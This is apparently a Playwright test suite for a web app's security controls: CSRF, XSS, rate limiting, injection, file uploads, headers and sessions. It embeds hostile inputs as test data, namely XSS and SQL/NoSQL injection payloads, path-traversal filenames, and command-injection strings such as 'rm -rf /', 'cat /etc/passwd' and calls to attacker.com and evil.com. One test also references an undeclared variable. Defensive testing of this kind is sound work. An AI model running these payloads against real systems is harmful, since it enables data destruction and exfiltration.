/**
 * Ultra-Enterprise Security Vulnerability Tests - Task 3.15
 * 
 * Comprehensive security testing for banking-grade applications
 * Validates protection against CSRF, XSS, injection attacks, and rate limiting.
 * Ensures Turkish KVKV compliance and ultra-enterprise security standards.
 */

import { test, expect, Page, Request } from '@playwright/test'
import { SecurityTestUtils, AuthTestUtils, TEST_CORRELATION_ID } from '../utils/test-utils'

test.describe('Security Vulnerability Testing', () => {
  let securityUtils: SecurityTestUtils
  let authUtils: AuthTestUtils

  test.beforeEach(async ({ page, request }) => {
    securityUtils = new SecurityTestUtils(page, request)
    authUtils = new AuthTestUtils(page, request)
    
    // Set test correlation ID
    await page.addInitScript(() => {
      window.localStorage.setItem('test-correlation-id', TEST_CORRELATION_ID)
    })
  })

  test.describe('CSRF Protection Validation', () => {
    test('should enforce CSRF protection on state-changing requests', async ({ page, request }) => {
      console.log('🔒 Testing CSRF protection enforcement...')
      
      await page.goto('/auth/login')
      
      // Get CSRF token from meta tag
      const csrfToken = await page.evaluate(() => {
        return document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')
      })
      
      expect(csrfToken).toBeTruthy()
      console.log('✅ CSRF token found in page meta')
      
      // Attempt POST request without CSRF token (should fail)
      const responseWithoutCsrf = await request.post('/api/v1/auth/login', {
        headers: {
          'Content-Type': 'application/json',
          'Origin': 'http://localhost:3000',
          'Referer': 'http://localhost:3000/auth/login'
        },
        data: {
          email: 'test@example.com',
          password: 'password123'
        }
      })
      
      expect(responseWithoutCsrf.status()).toBe(403)
      const errorData = await responseWithoutCsrf.json()
      expect(errorData.error_code).toBe('ERR_CSRF_INVALID')
      expect(errorData.message).toContain('CSRF')
      console.log('✅ Request without CSRF token properly rejected')
      
      // Attempt with invalid CSRF token (should fail)
      const responseWithInvalidCsrf = await request.post('/api/v1/auth/login', {
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': 'invalid-token-12345',
          'Origin': 'http://localhost:3000',
          'Referer': 'http://localhost:3000/auth/login'
        },
        data: {
          email: 'test@example.com',
          password: 'password123'
        }
      })
      
      expect(responseWithInvalidCsrf.status()).toBe(403)
      console.log('✅ Request with invalid CSRF token properly rejected')
      
      // Attempt with valid CSRF token (should proceed to authentication validation)
      const responseWithValidCsrf = await request.post('/api/v1/auth/login', {
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrfToken,
          'Origin': 'http://localhost:3000',
          'Referer': 'http://localhost:3000/auth/login'
        },
        data: {
          email: 'test@example.com',
          password: 'wrongpassword'
        }
      })
      
      // Should get authentication error, not CSRF error
      expect(responseWithValidCsrf.status()).toBe(401)
      const authErrorData = await responseWithValidCsrf.json()
      expect(authErrorData.error_code).toBe('ERR_INVALID_CREDENTIALS')
      console.log('✅ Request with valid CSRF token bypassed CSRF protection')
    })

    test('should validate CSRF token rotation and expiry', async ({ page, request }) => {
      console.log('🔄 Testing CSRF token rotation...')
      
      await page.goto('/auth/login')
      
      // Get initial CSRF token
      const initialCsrfToken = await page.evaluate(() => {
        return document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')
      })
      
      // Reload page to get new CSRF token
      await page.reload()
      
      const newCsrfToken = await page.evaluate(() => {
        return document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')
      })
      
      // CSRF tokens should be different (rotated)
      expect(newCsrfToken).not.toBe(initialCsrfToken)
      console.log('✅ CSRF token properly rotated on page reload')
      
      // Old token should be invalid
      const responseWithOldToken = await request.post('/api/v1/auth/login', {
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': initialCsrfToken,
          'Origin': 'http://localhost:3000'
        },
        data: {
          email: 'test@example.com',
          password: 'password123'
        }
      })
      
      expect(responseWithOldToken.status()).toBe(403)
      console.log('✅ Old CSRF token properly invalidated')
    })

    test('should protect against CSRF double-submit cookie attacks', async ({ page, request }) => {
      console.log('🍪 Testing CSRF double-submit cookie protection...')
      
      await page.goto('/auth/login')
      
      // Get CSRF token
      const csrfToken = await page.evaluate(() => {
        return document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')
      })
      
      // Get cookies to check for CSRF cookie
      const cookies = await page.context().cookies()
      const csrfCookie = cookies.find(c => c.name === 'csrf_token' || c.name.includes('csrf'))
      
      expect(csrfCookie).toBeTruthy()
      expect(csrfCookie?.httpOnly).toBe(true)
      expect(csrfCookie?.sameSite).toBe('Strict')
      console.log('✅ CSRF cookie has proper security attributes')
      
      // Attempt to manipulate CSRF cookie value
      await page.context().addCookies([{
        name: csrfCookie!.name,
        value: 'manipulated-value',
        domain: csrfCookie!.domain,
        path: csrfCookie!.path,
        httpOnly: true,
        sameSite: 'Strict'
      }])
      
      // Request should fail due to token/cookie mismatch
      const responseWithManipulatedCookie = await request.post('/api/v1/auth/login', {
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrfToken,
          'Origin': 'http://localhost:3000'
        },
        data: {
          email: 'test@example.com',
          password: 'password123'
        }
      })
      
      expect(responseWithManipulatedCookie.status()).toBe(403)
      console.log('✅ CSRF cookie manipulation properly detected and blocked')
    })
  })

  test.describe('XSS Protection Validation', () => {
    test('should prevent reflected XSS attacks', async ({ page }) => {
      console.log('🔍 Testing reflected XSS protection...')
      
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '"><script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src=x onerror=alert("xss")>',
        '<svg onload=alert("xss")>',
        '\'"--></title></script><script>alert("xss")</script>',
        '<iframe src="javascript:alert(`xss`)"></iframe>'
      ]
      
      for (const payload of xssPayloads) {
        console.log(`Testing XSS payload: ${payload.substring(0, 30)}...`)
        
        // Try XSS in login form
        await page.goto('/auth/login')
        
        await page.fill('input[name="email"]', payload)
        await page.fill('input[name="password"]', 'password123')
        
        await page.click('button[type="submit"]')
        
        // Wait for any potential script execution
        await page.waitForTimeout(1000)
        
        // Check that no alert dialog appeared
        const alerts = await page.locator('role=dialog').count()
        expect(alerts).toBe(0)
        
        // Check that payload was sanitized in the input
        const emailValue = await page.inputValue('input[name="email"]')
        expect(emailValue).not.toContain('<script>')
        expect(emailValue).not.toContain('javascript:')
        expect(emailValue).not.toContain('onerror=')
        
        console.log('✅ XSS payload properly sanitized')
      }
    })

    test('should prevent stored XSS in user profiles', async ({ page }) => {
      console.log('💾 Testing stored XSS protection...')
      
      // Create test user and login
      const testUser = await authUtils.registerUser(AuthTestUtils.generateTestCredentials())
      await authUtils.loginWithPassword(testUser.email, testUser.password)
      
      // Navigate to profile page
      await page.goto('/profile/edit')
      
      const xssPayload = '<script>window.xssTriggered = true</script>'
      
      // Try to inject XSS in profile fields
      await page.fill('input[name="firstName"]', xssPayload)
      await page.fill('input[name="lastName"]', `"><script>alert("xss")</script>`)
      await page.fill('textarea[name="bio"]', '<img src=x onerror=alert("stored-xss")>')
      
      await page.click('button[type="submit"]')
      
      // Wait for save
      await page.waitForTimeout(2000)
      
      // Reload page to check stored content
      await page.reload()
      
      // Check that XSS was not executed
      const xssTriggered = await page.evaluate(() => window.xssTriggered)
      expect(xssTriggered).toBeFalsy()
      
      // Check that content was sanitized
      const firstName = await page.inputValue('input[name="firstName"]')
      const lastName = await page.inputValue('input[name="lastName"]')
      const bio = await page.inputValue('textarea[name="bio"]')
      
      expect(firstName).not.toContain('<script>')
      expect(lastName).not.toContain('<script>')
      expect(bio).not.toContain('onerror=')
      
      console.log('✅ Stored XSS properly prevented and content sanitized')
    })

    test('should protect against DOM-based XSS', async ({ page }) => {
      console.log('🌐 Testing DOM-based XSS protection...')
      
      // Test URL parameter injection
      const xssUrl = '/auth/login?redirect=javascript:alert("dom-xss")'
      await page.goto(xssUrl)
      
      // Check that redirect parameter was sanitized
      const redirectValue = await page.evaluate(() => {
        const params = new URLSearchParams(window.location.search)
        return params.get('redirect')
      })
      
      expect(redirectValue).not.toContain('javascript:')
      
      // Test hash-based XSS
      await page.goto('/auth/login#<script>alert("hash-xss")</script>')
      
      await page.waitForTimeout(1000)
      
      // Verify no script execution
      const alerts = await page.locator('role=dialog').count()
      expect(alerts).toBe(0)
      
      console.log('✅ DOM-based XSS properly prevented')
    })

    test('should validate Content Security Policy headers', async ({ page }) => {
      console.log('🛡️ Testing Content Security Policy...')
      
      const response = await page.goto('/auth/login')
      const headers = response?.headers() || {}
      
      const csp = headers['content-security-policy']
      expect(csp).toBeTruthy()
      
      // Validate CSP directives
      expect(csp).toContain("default-src 'self'")
      expect(csp).toContain("script-src 'self'")
      expect(csp).toContain("style-src 'self'")
      expect(csp).toContain("img-src 'self'")
      expect(csp).toContain("object-src 'none'")
      expect(csp).toContain("base-uri 'self'")
      
      console.log('✅ Content Security Policy properly configured')
      
      // Test CSP violation reporting
      await page.evaluate(() => {
        // Try to inject inline script (should be blocked by CSP)
        const script = document.createElement('script')
        script.textContent = 'window.cspViolated = true'
        document.head.appendChild(script)
      })
      
      await page.waitForTimeout(1000)
      
      // CSP should have blocked the inline script
      const cspViolated = await page.evaluate(() => window.cspViolated)
      expect(cspViolated).toBeFalsy()
      
      console.log('✅ CSP successfully blocked inline script execution')
    })
  })

  test.describe('Rate Limiting Validation', () => {
    test('should enforce login rate limiting', async ({ page, request }) => {
      console.log('⚡ Testing login rate limiting...')
      
      const testEmail = 'ratelimit.test@freecad-test.local'
      const attempts = []
      
      // Make multiple login attempts rapidly
      for (let i = 0; i < 6; i++) {
        attempts.push(
          request.post('/api/v1/auth/login', {
            headers: {
              'Content-Type': 'application/json',
              'X-Test-Correlation-ID': TEST_CORRELATION_ID
            },
            data: {
              email: testEmail,
              password: 'wrongpassword'
            }
          })
        )
      }
      
      const responses = await Promise.all(attempts)
      
      // First few attempts should get 401 (unauthorized)
      expect(responses[0].status()).toBe(401)
      expect(responses[1].status()).toBe(401)
      
      // Later attempts should get 429 (rate limited)
      const rateLimitedResponse = responses[responses.length - 1]
      expect(rateLimitedResponse.status()).toBe(429)
      
      const errorData = await rateLimitedResponse.json()
      expect(errorData.error_code).toBe('ERR_RATE_LIMIT_EXCEEDED')
      expect(errorData.message).toContain('çok fazla')
      
      // Should include Retry-After header
      const retryAfter = rateLimitedResponse.headers()['retry-after']
      expect(retryAfter).toBeTruthy()
      expect(parseInt(retryAfter)).toBeGreaterThan(0)
      
      console.log(`✅ Rate limiting enforced after attempts, retry after: ${retryAfter}s`)
    })

    test('should enforce registration rate limiting', async ({ request }) => {
      console.log('📝 Testing registration rate limiting...')
      
      const attempts = []
      
      // Make multiple registration attempts from same IP
      for (let i = 0; i < 4; i++) {
        attempts.push(
          request.post('/api/v1/auth/register', {
            headers: {
              'Content-Type': 'application/json',
              'X-Test-Correlation-ID': TEST_CORRELATION_ID
            },
            data: {
              email: `ratelimit${i}@freecad-test.local`,
              password: 'Password123!',
              firstName: 'Rate',
              lastName: 'Limit',
              acceptTerms: true,
              acceptKvkv: true
            }
          })
        )
      }
      
      const responses = await Promise.all(attempts)
      
      // Early attempts should be rejected for validation reasons
      expect(responses[0].status()).toBe(400)
      
      // Later attempts should be rate limited
      const lastResponse = responses[responses.length - 1]
      if (lastResponse.status() === 429) {
        const errorData = await lastResponse.json()
        expect(errorData.error_code).toBe('ERR_RATE_LIMIT_EXCEEDED')
        console.log('✅ Registration rate limiting enforced')
      } else {
        console.log('ℹ️  Registration rate limit not hit with current test volume')
      }
    })

    test('should enforce API endpoint rate limiting', async ({ request }) => {
      console.log('🔗 Testing API endpoint rate limiting...')
      
      // Test rate limiting on a protected endpoint
      const attempts = []
      
      for (let i = 0; i < 10; i++) {
        attempts.push(
          request.get('/api/v1/me', {
            headers: {
              'Authorization': 'Bearer invalid-token',
              'X-Test-Correlation-ID': TEST_CORRELATION_ID
            }
          })
        )
      }
      
      const responses = await Promise.all(attempts)
      
      // Check if any responses are rate limited
      const rateLimitedResponses = responses.filter(r => r.status() === 429)
      
      if (rateLimitedResponses.length > 0) {
        const rateLimitedResponse = rateLimitedResponses[0]
        const errorData = await rateLimitedResponse.json()
        expect(errorData.error_code).toBe('ERR_RATE_LIMIT_EXCEEDED')
        
        const retryAfter = rateLimitedResponse.headers()['retry-after']
        expect(retryAfter).toBeTruthy()
        
        console.log('✅ API endpoint rate limiting enforced')
      } else {
        console.log('ℹ️  API rate limit not hit with current test volume')
      }
    })

    test('should implement progressive rate limiting penalties', async ({ request }) => {
      console.log('📈 Testing progressive rate limiting...')
      
      const testEmail = 'progressive.test@freecad-test.local'
      
      // First round of failed attempts
      for (let i = 0; i < 3; i++) {
        await request.post('/api/v1/auth/login', {
          headers: { 'Content-Type': 'application/json' },
          data: { email: testEmail, password: 'wrong' }
        })
      }
      
      // Wait for penalty period and try again
      await page.waitForTimeout(2000)
      
      // Second round should have higher penalty
      const attempts = []
      for (let i = 0; i < 3; i++) {
        attempts.push(
          request.post('/api/v1/auth/login', {
            headers: { 'Content-Type': 'application/json' },
            data: { email: testEmail, password: 'wrong' }
          })
        )
      }
      
      const responses = await Promise.all(attempts)
      const rateLimitedResponse = responses.find(r => r.status() === 429)
      
      if (rateLimitedResponse) {
        const retryAfter = parseInt(rateLimitedResponse.headers()['retry-after'] || '0')
        expect(retryAfter).toBeGreaterThan(60) // Should be longer penalty
        
        console.log(`✅ Progressive rate limiting working, penalty: ${retryAfter}s`)
      }
    })
  })

  test.describe('Input Validation and Injection Protection', () => {
    test('should prevent SQL injection attacks', async ({ request }) => {
      console.log('💉 Testing SQL injection protection...')
      
      const sqlPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "'; INSERT INTO users (email) VALUES ('hacked@test.com'); --",
        "' OR 1=1 LIMIT 1 --"
      ]
      
      for (const payload of sqlPayloads) {
        console.log(`Testing SQL payload: ${payload.substring(0, 20)}...`)
        
        const response = await request.post('/api/v1/auth/login', {
          headers: { 'Content-Type': 'application/json' },
          data: {
            email: payload,
            password: 'password123'
          }
        })
        
        // Should get input validation error, not SQL error
        expect(response.status()).toBe(422)
        
        const responseData = await response.json()
        
        // Should not contain SQL error messages
        const responseText = JSON.stringify(responseData).toLowerCase()
        expect(responseText).not.toContain('syntax error')
        expect(responseText).not.toContain('mysql')
        expect(responseText).not.toContain('postgresql')
        expect(responseText).not.toContain('ora-')
        
        console.log('✅ SQL injection payload properly handled')
      }
    })

    test('should prevent NoSQL injection attacks', async ({ request }) => {
      console.log('🍃 Testing NoSQL injection protection...')
      
      const noSqlPayloads = [
        { email: { $ne: null }, password: { $ne: null } },
        { email: { $regex: ".*" }, password: { $regex: ".*" } },
        { email: { $where: "this.email.length > 0" }, password: "test" },
        { email: { $gt: "" }, password: { $gt: "" } }
      ]
      
      for (const payload of noSqlPayloads) {
        console.log(`Testing NoSQL payload: ${JSON.stringify(payload)}`)
        
        const response = await request.post('/api/v1/auth/login', {
          headers: { 'Content-Type': 'application/json' },
          data: payload
        })
        
        // Should get validation error
        expect(response.status()).toBe(422)
        
        console.log('✅ NoSQL injection payload properly rejected')
      }
    })

    test('should validate and sanitize file upload inputs', async ({ page }) => {
      console.log('📎 Testing file upload security...')
      
      // Create authenticated session
      const testUser = await authUtils.registerUser(AuthTestUtils.generateTestCredentials())
      await authUtils.loginWithPassword(testUser.email, testUser.password)
      
      await page.goto('/profile/avatar')
      
      // Test malicious file upload attempts
      const maliciousFiles = [
        { name: 'malware.exe', type: 'application/x-executable' },
        { name: 'script.php', type: 'application/x-php' },
        { name: 'payload.jsp', type: 'application/x-jsp' },
        { name: 'virus.bat', type: 'application/x-bat' },
        { name: '../../../etc/passwd', type: 'text/plain' },
        { name: 'file.jpg.php', type: 'image/jpeg' } // Double extension
      ]
      
      for (const file of maliciousFiles) {
        console.log(`Testing malicious file: ${file.name}`)
        
        // Create fake file
        const buffer = Buffer.from('fake content')
        
        await page.setInputFiles('input[type="file"]', {
          name: file.name,
          mimeType: file.type,
          buffer: buffer
        })
        
        await page.click('button[type="submit"]')
        
        // Should show file type error
        await expect(page.locator('text=Geçersiz dosya türü')).toBeVisible()
        
        console.log('✅ Malicious file upload properly blocked')
        
        // Clear the input for next test
        await page.setInputFiles('input[type="file"]', [])
      }
    })

    test('should prevent command injection attacks', async ({ page, request }) => {
      console.log('⚡ Testing command injection protection...')
      
      // Create authenticated session
      const testUser = await authUtils.registerUser(AuthTestUtils.generateTestCredentials())
      await authUtils.loginWithPassword(testUser.email, testUser.password)
      
      const commandPayloads = [
        'test; cat /etc/passwd',
        'test && rm -rf /',
        'test | nc attacker.com 1337',
        'test `whoami`',
        'test $(id)',
        'test & ping google.com',
        'test || curl evil.com'
      ]
      
      // Test in a form that might process user input
      await page.goto('/cad/new-project')
      
      for (const payload of commandPayloads) {
        console.log(`Testing command injection: ${payload.substring(0, 20)}...`)
        
        await page.fill('input[name="projectName"]', payload)
        await page.click('button[type="submit"]')
        
        // Wait for processing
        await page.waitForTimeout(1000)
        
        // Should get validation error, not execute command
        const errorMessage = await page.locator('.error-message').textContent()
        if (errorMessage) {
          expect(errorMessage).not.toContain('bin')
          expect(errorMessage).not.toContain('usr')
          expect(errorMessage).not.toContain('root')
        }
        
        console.log('✅ Command injection payload properly sanitized')
      }
    })
  })

  test.describe('Security Headers Validation', () => {
    test('should enforce comprehensive security headers', async ({ page }) => {
      console.log('🛡️ Testing security headers...')
      
      const response = await page.goto('/auth/login')
      const headers = response?.headers() || {}
      
      // Essential security headers
      const securityHeaders = {
        'x-frame-options': 'DENY',
        'x-content-type-options': 'nosniff',
        'x-xss-protection': '1; mode=block',
        'strict-transport-security': /max-age=\d+/,
        'content-security-policy': /default-src/,
        'referrer-policy': 'strict-origin-when-cross-origin',
        'permissions-policy': /.*/
      }
      
      for (const [headerName, expectedValue] of Object.entries(securityHeaders)) {
        const headerValue = headers[headerName]
        expect(headerValue).toBeTruthy()
        
        if (typeof expectedValue === 'string') {
          expect(headerValue).toBe(expectedValue)
        } else {
          expect(headerValue).toMatch(expectedValue)
        }
        
        console.log(`✅ ${headerName}: ${headerValue}`)
      }
      
      // Verify no sensitive headers are exposed
      const sensitiveHeaders = ['server', 'x-powered-by', 'x-aspnet-version']
      for (const headerName of sensitiveHeaders) {
        expect(headers[headerName]).toBeFalsy()
      }
      
      console.log('✅ No sensitive server information exposed')
    })

    test('should enforce HTTPS in production mode', async ({ page, request }) => {
      console.log('🔒 Testing HTTPS enforcement...')
      
      // Skip this test in local development
      if (process.env.NODE_ENV !== 'production') {
        console.log('ℹ️  Skipping HTTPS test in development mode')
        return
      }
      
      // Test HTTP to HTTPS redirect
      const httpResponse = await request.get('http://localhost:3000/auth/login', {
        maxRedirects: 0
      })
      
      expect(httpResponse.status()).toBe(301)
      
      const location = httpResponse.headers()['location']
      expect(location).toMatch(/^https:\/\//)
      
      console.log('✅ HTTP to HTTPS redirect working')
    })
  })

  test.describe('Session Security Validation', () => {
    test('should enforce secure cookie attributes', async ({ page }) => {
      console.log('🍪 Testing secure cookie attributes...')
      
      // Login to create session cookies
      const testUser = await authUtils.registerUser(AuthTestUtils.generateTestCredentials())
      await authUtils.loginWithPassword(testUser.email, testUser.password)
      
      const cookies = await page.context().cookies()
      
      // Check auth cookies
      const authCookies = cookies.filter(c => 
        c.name.includes('rt') || 
        c.name.includes('csrf') ||
        c.name.includes('session')
      )
      
      for (const cookie of authCookies) {
        expect(cookie.httpOnly).toBe(true)
        expect(cookie.secure).toBe(true) // Should be true in production
        expect(cookie.sameSite).toBe('Strict')
        
        console.log(`✅ Cookie ${cookie.name} has secure attributes`)
      }
    })

    test('should prevent session fixation attacks', async ({ page, context }) => {
      console.log('🔄 Testing session fixation protection...')
      
      // Get initial session ID
      await page.goto('/auth/login')
      const initialCookies = await context.cookies()
      const initialSessionCookie = initialCookies.find(c => c.name.includes('session') || c.name.includes('rt'))
      
      // Login
      const testUser = await authUtils.registerUser(AuthTestUtils.generateTestCredentials())
      await authUtils.loginWithPassword(testUser.email, testUser.password)
      
      // Check if session ID changed after login
      const postLoginCookies = await context.cookies()
      const postLoginSessionCookie = postLoginCookies.find(c => c.name.includes('session') || c.name.includes('rt'))
      
      if (initialSessionCookie && postLoginSessionCookie) {
        expect(postLoginSessionCookie.value).not.toBe(initialSessionCookie.value)
        console.log('✅ Session ID properly regenerated after login')
      } else {
        console.log('ℹ️  Session rotation test inconclusive - no comparable session cookies')
      }
    })

    test('should handle concurrent session limits', async ({ browser }) => {
      console.log('👥 Testing concurrent session limits...')
      
      const testUser = await authUtils.registerUser(AuthTestUtils.generateTestCredentials())
      
      // Create multiple browser contexts (sessions)
      const contexts = []
      const pages = []
      
      for (let i = 0; i < 3; i++) {
        const context = await browser.newContext()
        const page = await context.newPage()
        const newAuthUtils = new AuthTestUtils(page, page.request)
        
        contexts.push(context)
        pages.push(page)
        
        // Login with same user in multiple sessions
        await newAuthUtils.loginWithPassword(testUser.email, testUser.password)
      }
      
      // Check if older sessions were invalidated
      for (let i = 0; i < pages.length - 1; i++) {
        await pages[i].goto('/dashboard')
        
        // Older sessions might be invalidated (depending on session limit)
        const url = pages[i].url()
        if (url.includes('/auth/login')) {
          console.log(`✅ Session ${i} was invalidated due to concurrent session limit`)
        } else {
          console.log(`ℹ️  Session ${i} still active - concurrent sessions allowed`)
        }
      }
      
      // Cleanup
      for (const context of contexts) {
        await context.close()
      }
    })
  })
})